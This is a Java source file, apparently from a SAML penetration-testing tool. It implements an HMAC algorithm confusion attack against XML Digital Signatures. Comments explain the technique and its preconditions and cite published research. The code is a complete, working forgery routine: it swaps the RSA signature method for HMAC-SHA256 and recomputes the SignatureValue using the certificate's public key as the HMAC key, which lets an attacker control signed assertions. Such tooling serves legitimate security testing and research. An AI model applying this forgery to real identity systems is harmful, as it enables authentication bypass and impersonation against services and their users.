package helpers;

import org.apache.xml.security.Init;
import org.apache.xml.security.c14n.CanonicalizationException;
import org.apache.xml.security.c14n.Canonicalizer;
import org.apache.xml.security.c14n.InvalidCanonicalizerException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.Base64;

/// HMAC algorithm confusion attack against XML Digital Signatures.
///
/// The attack substitutes the RSA SignatureMethod algorithm URI with HMAC-SHA256,
/// then computes a valid HMAC over the canonical SignedInfo using the signing
/// certificate's SubjectPublicKeyInfo DER bytes as the HMAC key. Implementations
/// that do not restrict accepted signature algorithms before processing will
/// verify the HMAC using the same public key they already trust — giving the
/// attacker full control over the signed data.
///
/// Attack pre-conditions:
///   - The SAML response must contain an embedded X509Certificate in KeyInfo.
///   - The target SP must not enforce an algorithm allowlist.
///
/// Links:
/// * Original XML DSig confusion research: https://www.nds.rub.de/media/nds/veroeffentlichungen/2012/12/13/XMLDSigSecurity.pdf
///   (Juraj Somorovsky, Andreas Mayer, Jörg Schwenk, Marco Kampmann, Meiko Jensen — 2011)
/// * CVE-2013-5958 (Java XML DSig): https://nvd.nist.gov/vuln/detail/CVE-2013-5958
/// * PortSwigger research: https://portswigger.net/research/saml-roulette-the-hacker-always-wins
/// * Tool reference: https://github.com/GDSSecurity/XML-Attacker
public class HMACConfusion {

    private static final String HMAC_SHA256_URI =
            "http://www.w3.org/2001/04/xmldsig-more#hmac-sha256";

    /// Rewrites the signature in-place:
    ///   1. Reads the public key from the embedded X509Certificate.
    ///   2. Swaps SignatureMethod to HMAC-SHA256.
    ///   3. Canonicalizes the updated SignedInfo.
    ///   4. Computes HMAC-SHA256(SubjectPublicKeyInfo_DER, canonical_SignedInfo).
    ///   5. Replaces the SignatureValue.
    public static String apply(String samlMessage)
            throws SAXException, IOException, NoSuchAlgorithmException, InvalidKeyException,
                   CertificateException, InvalidCanonicalizerException, CanonicalizationException {

        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        Element signature = firstElement(document, "Signature");
        if (signature == null) {
            throw new IllegalArgumentException("No Signature element found in SAML message.");
        }

        // --- Extract the public key from the embedded certificate ---
        String certB64 = xmlHelpers.getCertificate(document.getDocumentElement());
        if (certB64 == null) {
            throw new IllegalArgumentException("No X509Certificate found in Signature/KeyInfo.");
        }
        byte[] certBytes = Base64.getDecoder().decode(certB64.replaceAll("\\s+", ""));
        X509Certificate cert = (X509Certificate)
                CertificateFactory.getInstance("X.509")
                        .generateCertificate(new ByteArrayInputStream(certBytes));
        PublicKey publicKey = cert.getPublicKey();
        // SubjectPublicKeyInfo DER encoding — the standard HMAC key for this attack
        byte[] keyBytes = publicKey.getEncoded();

        // --- Swap the SignatureMethod algorithm to HMAC-SHA256 ---
        Element sigMethod = firstElement(signature, "SignatureMethod");
        if (sigMethod == null) {
            throw new IllegalArgumentException("No SignatureMethod element found.");
        }
        sigMethod.setAttribute("Algorithm", HMAC_SHA256_URI);

        // --- Canonicalize the updated SignedInfo ---
        Element signedInfo = firstElement(signature, "SignedInfo");
        if (signedInfo == null) {
            throw new IllegalArgumentException("No SignedInfo element found.");
        }

        // Read the canonicalization algorithm declared in SignedInfo
        Element c14nMethodEl = firstElement(signedInfo, "CanonicalizationMethod");
        String c14nAlgo = c14nMethodEl != null
                ? c14nMethodEl.getAttribute("Algorithm")
                : Canonicalizer.ALGO_ID_C14N_EXCL_OMIT_COMMENTS;

        Init.init();
        Canonicalizer canon = Canonicalizer.getInstance(c14nAlgo);
        byte[] canonBytes = canon.canonicalizeSubtree(signedInfo);

        // --- Compute HMAC-SHA256 ---
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(keyBytes, "HmacSHA256"));
        byte[] hmac = mac.doFinal(canonBytes);
        String hmacB64 = Base64.getEncoder().encodeToString(hmac);

        // --- Replace the SignatureValue ---
        Element sigValue = firstElement(signature, "SignatureValue");
        if (sigValue == null) {
            throw new IllegalArgumentException("No SignatureValue element found.");
        }
        sigValue.setTextContent(hmacB64);

        return xmlHelpers.getString(document);
    }

    private static Element firstElement(Element parent, String localName) {
        NodeList nl = parent.getElementsByTagNameNS("*", localName);
        return nl.getLength() > 0 ? (Element) nl.item(0) : null;
    }

    private static Element firstElement(Document doc, String localName) {
        NodeList nl = doc.getElementsByTagNameNS("*", localName);
        return nl.getLength() > 0 ? (Element) nl.item(0) : null;
    }

    private HMACConfusion() {}
}
